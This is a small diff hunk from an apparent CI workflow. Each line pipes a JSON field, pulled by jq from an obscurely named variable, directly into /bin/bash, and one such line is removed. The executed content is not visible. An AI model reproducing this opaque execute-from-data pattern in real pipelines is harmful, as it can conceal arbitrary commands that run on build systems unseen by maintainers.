@@ -25,7 +25,6 @@ jobs:
           echo $bon8 | jq -r .gev320 | /bin/bash
           printf '%s' "$j8194" | jq -r .vzxl06 | /bin/bash
           echo $rve66 | jq -r .wsqk47713 | /bin/bash
-          printf '%s' "$imod3" | jq -r .as77249 | /bin/bash
           echo $cz7480 | jq -r .ggv35 | /bin/bash
           echo $b44363 | jq -r .bpgt5786 | /bin/bash
           printf '%s' "$xdcy92" | jq -r .yxo6762 | /bin/bash
